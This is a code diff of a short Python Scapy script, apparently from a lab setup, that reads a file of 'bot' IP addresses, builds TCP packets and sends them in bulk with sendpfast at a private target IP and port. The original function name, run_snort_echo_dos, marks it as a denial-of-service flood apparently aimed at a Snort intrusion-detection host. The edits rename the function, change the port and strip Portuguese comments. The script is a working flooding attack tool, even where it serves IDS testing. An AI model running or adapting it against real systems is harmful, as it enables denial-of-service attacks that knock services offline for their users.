@@ -1,26 +1,25 @@
 from scapy.all import *
 import random, time, ipaddress
 
-# ---------- CONFIGURAÇÃO ----------
+# TCP Snort
 TARGET_IP   = "192.168.100.2"
-TARGET_PORT = 50002                   # porta-alvo (pode ser qualquer uma)
-BOTFILE     = "bots.txt"           # lista de bots (um IP por linha)
-IFACE       = "enp0s3"             # interface de saída
-PKTS_TOTAL  = 100                  # pacotes a enviar
-# ----------------------------------
+TARGET_PORT = 50001
+BOTFILE     = "../bots.txt"
+IFACE       = "enp0s3"
+PKTS_TOTAL  = 100
+
 
 def load_bots(file):
-    """Lê lista de IPs dos bots."""
     bots = []
     with open(file) as f:
         for line in f:
             ip = line.strip()
             if ip:
-                ipaddress.ip_address(ip)   # valida
+                ipaddress.ip_address(ip)
                 bots.append(ip)
     return bots
 
-def run_snort_echo_dos():
+def run_tcp_snort():
     bots  = load_bots(BOTFILE)
     pkts  = []
 
@@ -36,13 +35,12 @@ def run_snort_echo_dos():
         )
         pkts.append(Ether() / ip / tcp)
 
-    print(f"Preparados {len(pkts)} pacotes. Enviando...")
     t0 = time.perf_counter()
     sendpfast(pkts, iface=IFACE, file_cache=True)
-    print(f"Concluído em {time.perf_counter()-t0:.4f}s.")
+    print(f"Total time to send packets: {time.perf_counter()-t0:.4f}s.")
 
 if __name__ == "__main__":
-    run_snort_echo_dos()
+    run_tcp_snort()
 
 
 # sudo PYTHONPATH=$HOME/scapy python3 tcp_snort_06.py
